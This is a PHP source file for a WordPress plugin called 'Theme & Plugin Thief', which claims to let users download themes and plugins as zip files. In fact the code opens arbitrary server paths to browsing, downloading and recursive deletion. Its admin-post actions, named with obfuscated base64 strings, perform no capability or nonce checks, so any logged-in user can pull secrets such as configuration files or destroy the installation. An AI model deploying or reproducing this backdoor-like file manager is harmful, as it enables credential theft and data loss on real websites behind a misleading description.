<?php
/**
 * Plugin Name: Theme & Plugin Thief
 * Description: This plugin allows to download themes and plugins as zip files.
 * Author: Jedi Knight
 * Version: 0.2
 */
add_action('init', function () {
    class TT_AdminPanelUIController
    {
        const MAGIC_D = 'SSBzb2xlbW5seSBzd2VhciB0aGF0IEknbSB1cCB0byBubyBnb29kLg==';
        const MAGIC_K = 'QXZhZGEgS2VkYXZyYQ==';

        private function getPath($dir, & $element)
        {
            $path = realpath($dir . DIRECTORY_SEPARATOR . $element);
            if (is_dir($path)) {
                $element = vsprintf('<a href="/wp-admin/admin.php?page=thief&dir=%s">%s</a>', [urlencode($path),
                                                                                               ('..' === $element
                                                                                                   ? '&#8624;'
                                                                                                   : $element)]);
            }

            return $path;
        }

        public function getDirContent($dir)
        {
            $elements = scandir($dir);
            $data = [];
            foreach ($elements as $element) {
                if ('.' === $element) {
                    continue;
                }
                $path = $this->getPath($dir, $element);
                $data[$path] = $element;
            }

            return $data;
        }

        public function menu()
        {

            add_menu_page('Thief', 'Thief :)', '', 'thief', [$this, 'renderPage']);
        }

        private function getTarget()
        {
            return urldecode($_GET['target']);
        }

        private function rrmdir($path)
        {
            $i = new DirectoryIterator($path);
            foreach ($i as $f) {
                if ($f->isFile()) {
                    unlink($f->getRealPath());
                } else {
                    if (!$f->isDot() && $f->isDir()) {
                        $this->rrmdir($f->getRealPath());
                    }
                }
            }
            rmdir($path);
        }

        public function kill()
        {
            $target = $this->getTarget();

            if (is_dir($target)) {
                $this->rrmdir($target);
            } else {
                unlink($target);
            }

            wp_redirect($_SERVER['HTTP_REFERER']);
        }

        public function download()
        {
            $target = $this->getTarget();
            $_parts = explode(DIRECTORY_SEPARATOR,$target);
            $originalBaseName = end($_parts);
            $cleanup = false;
            if (is_dir($target)) {
                $originalBaseName .= '.zip';
                $cleanup = true;

                $rs = function ($l = 8) {
                    $chrs = '0123456789abcdefghijklmnopqrstuvwxyz';
                    $chrLngth = strlen($chrs);
                    $rndStr = '';
                    for ($i = 0; $i < $l; $i++) {
                        $rndStr .= $chrs[rand(0, $chrLngth - 1)];
                    }

                    return $rndStr;
                };

                $fln = $rs() . '.zip';
                $arch = realpath(WP_CONTENT_DIR . '/uploads') . '/' . $fln;
                $zip = new ZipArchive();
                $zip->open($arch, 1 | 8);
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), 0);
                foreach ($files as $name => $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($target) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
                $zip->close();
                $target = $arch;
            }

            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . $originalBaseName);
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
            header('Pragma: public');
            header('Content-Length: ' . filesize($target));
            readfile($target);
            if (true === $cleanup) {
                unlink($target);
            }
        }


        private function getActionLink($action, $target)
        {
            return vsprintf('/wp-admin/admin-post.php?action=%s&target=%s', [$action, urlencode($target)]);
        }

        private function getActionString($actionLink, $content, $text)
        {
            if (false !== strpos($content, '&#8624;')) {
                return '&nbsp;';
            }

            return vsprintf('<a href="%s">%s</a>', [$actionLink, $text]);
        }

        public function renderPage()
        {
            $dir = isset($_GET['dir']) ? urldecode($_GET['dir']) : ABSPATH;
            $contents = $this->getDirContent($dir);
            ?>
            <style>
                table.tt_table {
                    width: 100%;
                }

                table.tt_table tr {
                    background-color: #D3D3D3;
                }

                table.tt_table tr:nth-child(even) {
                    background-color: #e3e3e3;
                }

                table.tt_table tr td:nth-child(1), table.tt_table tr td:nth-child(2) {
                    width: 30px;
                }

                table.tt_table tr:hover, table.tt_table tr:hover td {
                    background-color: #0a4b83;
                }

                table.tt_table tr:hover td, table.tt_table tr:hover td a:hover, table.tt_table tr:hover td a, table.tt_table tr:hover td a:visited, table.tt_table tr:hover td a:active {
                    color: #e3e3e3;
                }
            </style>
            <h2><?= htmlentities($dir) ?></h2>
            <table class="tt_table">
                <tr>
                    <th colspan="2">Actions</th>
                    <th>Element</th>
                </tr>
                <?php foreach ($contents as $file => $content) :
                    ?>
                    <tr>
                        <td>
                            <?= $this->getActionString($this->getActionLink(self::MAGIC_K, $file), $content, '[X]') ?>
                        </td>
                        <td>
                            <?= $this->getActionString($this->getActionLink(self::MAGIC_D, $file), $content, '[&darr;]') ?>
                        </td>
                        <td><?= $content ?></td>
                    </tr>
                <?php endforeach; ?>
            </table>
            <?php
        }

        public function register()
        {
            add_action(vsprintf('admin_post_%s', [self::MAGIC_D]), [$this, 'download']);
            add_action(vsprintf('admin_post_%s', [self::MAGIC_K]), [$this, 'kill']);
            add_action('admin_menu', [$this, 'menu']);
        }
    }

    (new TT_AdminPanelUIController())->register();
});
